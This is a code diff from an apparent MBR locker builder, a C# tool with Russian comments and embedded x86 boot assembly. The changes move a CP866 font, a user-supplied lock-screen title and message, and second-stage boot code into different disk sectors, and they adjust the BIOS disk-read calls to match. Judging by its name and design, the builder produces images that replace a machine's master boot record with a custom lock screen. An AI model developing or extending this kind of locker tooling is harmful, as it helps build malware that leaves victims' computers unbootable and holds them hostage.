@@ -322,22 +322,40 @@ namespace MbrLockerBuilder
         }
 
         // ============================================================
-// ГЕНЕРАЦИЯ ШРИФТА CP866 ИЗ РЕСУРСА (С ПОИСКОМ ПО ЧАСТИ ИМЕНИ)
-// ============================================================
-private byte[] GenerateCP866Font()
-{
-    // ============================================================
-    // МЕТОД 1: Поиск по части имени (как в FindResourceByPartialName)
-    // ============================================================
-    try
-    {
-        string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
-        foreach (string name in allResources)
+        // ГЕНЕРАЦИЯ ШРИФТА CP866 ИЗ РЕСУРСА (С ПОИСКОМ ПО ЧАСТИ ИМЕНИ)
+        // ============================================================
+        private byte[] GenerateCP866Font()
         {
-            // Ищем любой ресурс, содержащий "cp866_font.bin"
-            if (name.IndexOf("cp866_font.bin", StringComparison.OrdinalIgnoreCase) >= 0)
+            // ============================================================
+            // МЕТОД 1: Поиск по части имени (как в FindResourceByPartialName)
+            // ============================================================
+            try
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
+                string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+                foreach (string name in allResources)
+                {
+                    if (name.IndexOf("cp866_font.bin", StringComparison.OrdinalIgnoreCase) >= 0)
+                    {
+                        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
+                        {
+                            if (stream != null)
+                            {
+                                byte[] font = new byte[4096];
+                                stream.Read(font, 0, 4096);
+                                return font;
+                            }
+                        }
+                    }
+                }
+            }
+            catch { }
+
+            // ============================================================
+            // МЕТОД 2: Поиск по полному имени (запасной вариант)
+            // ============================================================
+            try
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.cp866_font.bin"))
                 {
                     if (stream != null)
                     {
@@ -347,55 +365,36 @@ private byte[] GenerateCP866Font()
                     }
                 }
             }
+            catch { }
+
+            // ============================================================
+            // МЕТОД 3: Поиск файла на диске (рядом с EXE)
+            // ============================================================
+            string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "cp866_font.bin");
+            if (File.Exists(localPath))
+                return File.ReadAllBytes(localPath);
+
+            // ============================================================
+            // МЕТОД 4: Поиск файла в папке проекта (для отладки)
+            // ============================================================
+            string projectPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "builder", "Resources", "cp866_font.bin");
+            if (File.Exists(projectPath))
+                return File.ReadAllBytes(projectPath);
+
+            // ============================================================
+            // Если ничего не найдено — предупреждение и пустой шрифт
+            // ============================================================
+            MessageBox.Show(
+                "Шрифт cp866_font.bin не найден!\n\n" +
+                "Русский текст будет отображаться неправильно.\n\n" +
+                "Проверьте, что файл cp866_font.bin добавлен в ресурсы проекта.",
+                "Предупреждение",
+                MessageBoxButtons.OK,
+                MessageBoxIcon.Warning
+            );
+            
+            return new byte[4096];
         }
-    }
-    catch { }
-
-    // ============================================================
-    // МЕТОД 2: Поиск по полному имени (запасной вариант)
-    // ============================================================
-    try
-    {
-        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.cp866_font.bin"))
-        {
-            if (stream != null)
-            {
-                byte[] font = new byte[4096];
-                stream.Read(font, 0, 4096);
-                return font;
-            }
-        }
-    }
-    catch { }
-
-    // ============================================================
-    // МЕТОД 3: Поиск файла на диске (рядом с EXE)
-    // ============================================================
-    string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "cp866_font.bin");
-    if (File.Exists(localPath))
-        return File.ReadAllBytes(localPath);
-
-    // ============================================================
-    // МЕТОД 4: Поиск файла в папке проекта (для отладки)
-    // ============================================================
-    string projectPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "builder", "Resources", "cp866_font.bin");
-    if (File.Exists(projectPath))
-        return File.ReadAllBytes(projectPath);
-
-    // ============================================================
-    // Если ничего не найдено — предупреждение и пустой шрифт
-    // ============================================================
-    MessageBox.Show(
-        "Шрифт cp866_font.bin не найден!\n\n" +
-        "Русский текст будет отображаться неправильно.\n\n" +
-        "Проверьте, что файл cp866_font.bin добавлен в ресурсы проекта.",
-        "Предупреждение",
-        MessageBoxButtons.OK,
-        MessageBoxIcon.Warning
-    );
-    
-    return new byte[4096];
-}
 
         // ============================================================
         // МЕТОДЫ ДЛЯ ПОДДЕРЖКИ РУССКОГО ЯЗЫКА
@@ -492,29 +491,35 @@ private byte[] GenerateCP866Font()
                 this.lblStatus.Text = "4/7 Сборка образа...";
                 Application.DoEvents();
 
-                int totalSectors = 18;
+                int totalSectors = 19;
                 byte[] fullImage = new byte[512 * totalSectors];
                 
                 // MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
                 
-                // Stage2 (сектора 9-17)
-                Array.Copy(stage2Bytes, 0, fullImage, 512 * 9, Math.Min(stage2Bytes.Length, 512 * 9));
+                // Stage2 (сектора 9-18)
+                Array.Copy(stage2Bytes, 0, fullImage, 512 * 9, Math.Min(stage2Bytes.Length, 512 * 10));
 
                 // ============================================================
-                // ЗАПИСЫВАЕМ ПОЛЬЗОВАТЕЛЬСКИЙ ШРИФТ (СЕКТОРА 3-4)
+                // ЗАПИСЫВАЕМ ПОЛЬЗОВАТЕЛЬСКИЙ ШРИФТ (СЕКТОРА 3-6)
                 // ============================================================
                 this.lblStatus.Text = "4.1/7 Генерация шрифта...";
                 Application.DoEvents();
 
                 byte[] fontData = GenerateCP866Font();
-                if (fontData != null && fontData.Length >= 1024)
+                if (fontData != null && fontData.Length >= 4096)
                 {
-                    Array.Copy(fontData, 0, fullImage, 512 * 3, 1024);
+                    // Шрифт занимает 4 сектора (4096 байт)
+                    Array.Copy(fontData, 0, fullImage, 512 * 3, 4096);
+                }
+                else
+                {
+                    MessageBox.Show("Шрифт cp866_font.bin не загружен или имеет неправильный размер!",
+                        "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
 
                 // ============================================================
-                // ЗАПИСЫВАЕМ ТЕКСТ В СЕКТОРА (5, 6) С ТЕРМИНАЛЬНЫМ НУЛЕМ
+                // ЗАПИСЫВАЕМ ТЕКСТ В СЕКТОРА (7, 8) С ТЕРМИНАЛЬНЫМ НУЛЕМ
                 // ============================================================
                 string title = this.txtTitle.Text.Trim();
                 string body = this.txtBody.Text.Trim();
@@ -525,17 +530,17 @@ private byte[] GenerateCP866Font()
                 string formattedTitle = "     " + title + "     \r\n";
                 string formattedBody = body.Replace("\n", "\r\n");
 
-                // --- Заголовок (сектор 5) с терминальным нулём ---
+                // --- Заголовок (сектор 7) с терминальным нулём ---
                 string titleText = border + formattedTitle + border + "\r\n\0";
                 byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(titleText);
                 if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
-                Array.Copy(titleBytes, 0, fullImage, 512 * 5, titleBytes.Length);
+                Array.Copy(titleBytes, 0, fullImage, 512 * 7, titleBytes.Length);
 
-                // --- Основной текст (сектор 6) с терминальным нулём ---
+                // --- Основной текст (сектор 8) с терминальным нулём ---
                 string bodyText = formattedBody + "\0";
                 byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(bodyText);
                 if (bodyBytes.Length > 512) Array.Resize(ref bodyBytes, 512);
-                Array.Copy(bodyBytes, 0, fullImage, 512 * 6, bodyBytes.Length);
+                Array.Copy(bodyBytes, 0, fullImage, 512 * 8, bodyBytes.Length);
 
                 this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
@@ -676,7 +681,7 @@ start:
     mov es, ax
     mov bx, 0x8000
     mov ah, 0x02
-    mov al, 9
+    mov al, 10
     mov ch, 0
     mov cl, 9
     mov dh, 0
@@ -760,7 +765,7 @@ start_stage2:
     mov es, ax
     mov bx, 0x1000
     mov ah, 0x02
-    mov al, 2
+    mov al, 4
     mov ch, 0
     mov cl, 3
     mov dh, 0
@@ -781,7 +786,7 @@ start_stage2:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 5
+    mov cl, 7
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -796,7 +801,7 @@ start_stage2:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 6
+    mov cl, 8
     mov dh, 0
     mov dl, 0x80
     int 0x13
